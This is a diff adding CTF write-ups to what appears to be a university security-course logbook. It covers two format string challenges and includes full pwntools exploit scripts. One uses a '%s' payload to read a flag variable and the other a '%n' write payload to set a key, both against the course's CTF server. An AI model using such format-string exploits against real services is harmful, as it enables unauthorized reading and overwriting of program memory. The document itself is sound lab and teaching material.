@@ -393,5 +393,111 @@ with open('badfile', 'wb') as f:
 ## Challenge 1 
 
 This first CTF challenge could be solved obtaining the adress of the global variable flag, and use an exploit template string to read the flag value.
+We followed this steps: 
+ - We used checksec program and got the following result: 
+
+![checksec](images/Logbook6images/ctf1checksec.png)
+
+ - Then, we used gdb program, and p load_flag to find out the global variable value as shown below: 
+
+![load](/images/Logbook6images/ctf1.1.png)
+
+ 
+Now we know the value of the variable. and modified the exploit
+
+```
+p.sendline(b"\x60\xC0\x04\x08-%s")
+```
+We already know the address of the function, so now we just need to read it. Since we can pass our string we can write load_flag()'s address and the use '%s' to read it. So, we change exploit_example.py to reflect this as shown below.
 
 
+Here's the full exploit code.
+
+```
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    """
+    O pause() para este script e permite-te usar o gdb para dar attach ao processo
+    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
+    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
+    Depois correr o gdb de forma a dar attach. 
+    (Exemplo: `$ gdb attach 9717` )
+    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
+    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
+    """
+    pause()
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+
+p.recvuntil(b"got:")
+p.sendline(b"\x60\xC0\x04\x08-%s")
+p.interactive()
+```
+
+
+By running the exploit we got the flag!
+
+
+![Final flag](images/Logbook6images/ctf1.png)
+
+
+
+# Challenge 2 
+
+On this challenge, when we run checksec we can see that there is the same restrictions from the first challenge.
+
+First we use checksec, and see that the security measures are the same as CTF1 
+
+Then by using gdb program and p &key  (because we want to know the location of the key and not the content itself), we get the following output 
+
+![key](/images/Logbook6images/ctf2gdb.png)
+
+Now by looking at the code on main.c, we can see that the key is 0xbeef
+
+0xBEEF = 48879
+We know that we have already written 8 chars so far, so 0xBEEF = 48879 - 8 = 48871
+
+Address for %x + address for %n + '%.Ax' + '%n'
+%x = \x34\xC0\x04\x08
+%n = \x34\xC0\x04\x08
+%.Ax = %.48871x
+%n = %n 
+
+We also need to change the connection to 4005
+
+
+```
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    """
+    O pause() para este script e permite-te usar o gdb para dar attach ao processo
+    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
+    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
+    Depois correr o gdb de forma a dar attach. 
+    (Exemplo: `$ gdb attach 9717` )
+    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
+    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
+    """
+    pause()
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
+p.recvuntil(b"here...")
+p.sendline(b"\x34\xC0\x04\x08\x34\xC0\x04\x08%.48871x%n")
+p.interactive()
+```
+
+
+
+
+Now after running the python3 exploit_example.py we get this output, followed by cat flag_txt
+
+![flag](/images/Logbook6images/ctf2flag.png)
